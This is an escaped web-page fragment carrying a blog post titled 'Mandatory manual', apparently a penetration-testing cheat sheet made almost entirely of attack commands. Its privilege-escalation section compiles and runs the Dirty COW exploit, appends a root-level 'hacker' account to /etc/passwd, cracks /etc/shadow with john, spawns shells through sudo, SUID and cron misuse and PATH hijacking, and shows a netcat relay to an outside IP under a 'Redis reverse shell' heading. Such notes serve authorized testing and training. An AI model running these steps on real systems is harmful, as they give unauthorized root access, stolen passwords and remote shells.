data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv 192.168.124.44 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -m 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;exploitation\&quot;&gt;Exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;smb\&quot;&gt;smb&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#smb\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux 192.168.124.40&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;smbclient -L 192.168.124.40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;linux\&quot;&gt;Linux&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#linux\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;kernel-stack-overflow\&quot;&gt;Kernel stack overflow&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kernel-stack-overflow\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;uname -a&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/*-release&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux 3.10 CentOS Linux 7&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;use tools&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./linux-exploit-suggester-2.pl&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Take the rights of dirty-cow as an example&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -pthread dirty.c -lcrypt -o dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod +x dirty&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./dirty fly&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;plain-password-of-root\&quot;&gt;Plain password of root&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#plain-password-of-root\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;If /etc/passwd can be write by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl passwd -1 -salt hacker 123456&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;generate &lt;code&gt;$1$hacker$4o50Z4aoUGaLMC0Rg4Io40&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;echo &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then login in user hacker&lt;/p&gt;\n&lt;p&gt;If /etc/shadow can be read by common user.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow /etc/passwd /etc/shadow &gt; shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 shadow.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;password-reuse\&quot;&gt;Password reuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#password-reuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;sudo-abuse\&quot;&gt;Sudo abuse&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#sudo-abuse\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;div class=\&quot;link-preview-block not-prose\&quot; data-state=\&quot;success\&quot;&gt;\n  &lt;a href=\&quot;https://gtfobins.github.io/\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GTFOBins - gtfobins.github.io\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;gtfobins.github.io&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GTFOBins&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://gtfobins.github.io/&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://gtfobins.github.io/assets/logo.png\&quot; alt=\&quot;GTFOBins\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;For example:&lt;code&gt;su,    awk,    man &lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo man man&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo vim -c &#39;:!/bin/sh&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;su-root-prohibited\&quot;&gt;’su root’ prohibited&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#su-root-prohibited\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo su&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;scheduled-task\&quot;&gt;Scheduled task&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#scheduled-task\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -l /etc/cron*&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cat /etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;If there is a scheduled task named 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ls -al /tmp/1.py    //查看是否有w权限&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Write the code into 1.py&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;import os &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;cp /bin/sh /tmp/sh&#39;) &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;os.system(&#39;chmod u+s /tmp/sh&#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code&gt;./tmp/sh&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;suid\&quot;&gt;SUID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#suid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Take nmap as an example:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;environment-variable-hijacking\&quot;&gt;Environment variable hijacking&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#environment-variable-hijacking\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Find command with suid just as 4.1.7.\nSuppose it is &lt;code&gt;su&lt;/code&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;vim /tmp/su         //write shellcode into su&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;administrator-configuration-error\&quot;&gt;Administrator configuration error&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#administrator-configuration-error\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Configuring a program with SUID that does not have the setuid(0) code, such as &lt;code&gt;find &lt;/code&gt;mentioned above.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;mkdir abc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find abc -exec &#39;/bin/sh&#39; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;docker-group\&quot;&gt;Docker group&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#docker-group\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;service-vulnerability\&quot;&gt;Service vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#service-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Redis reverse shell.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -l 12345 | nc 102.168.191.170 80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;windows\&quot;&gt;Windows&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;5-domain-penetration\&quot;&gt;5 Domain penetration&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#5-domain-penetration\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;port-scan&quot;],&quot;text&quot;:[0,&quot;Port scan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;web-scan&quot;],&quot;text&quot;:[0,&quot;Web scan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;vulnerability-analysis&quot;],&quot;text&quot;:[0,&quot;Vulnerability analysis&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;exploitation&quot;],&quot;text&quot;:[0,&quot;Exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;smb&quot;],&quot;text&quot;:[0,&quot;smb&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;kernel-stack-overflow&quot;],&quot;text&quot;:[0,&quot;Kernel stack overflow&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;plain-password-of-root&quot;],&quot;text&quot;:[0,&quot;Plain password of root&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;password-reuse&quot;],&quot;text&quot;:[0,&quot;Password reuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;sudo-abuse&quot;],&quot;text&quot;:[0,&quot;Sudo abuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;su-root-prohibited&quot;],&quot;text&quot;:[0,&quot;’su root’ prohibited&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;scheduled-task&quot;],&quot;text&quot;:[0,&quot;Scheduled task&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;suid&quot;],&quot;text&quot;:[0,&quot;SUID&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;environment-variable-hijacking&quot;],&quot;text&quot;:[0,&quot;Environment variable hijacking&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;administrator-configuration-error&quot;],&quot;text&quot;:[0,&quot;Administrator configuration error&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;docker-group&quot;],&quot;text&quot;:[0,&quot;Docker group&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;service-vulnerability&quot;],&quot;text&quot;:[0,&quot;Service vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;windows&quot;],&quot;text&quot;:[0,&quot;Windows&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;5-domain-penetration&quot;],&quot;text&quot;:[0,&quot;5 Domain penetration&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto 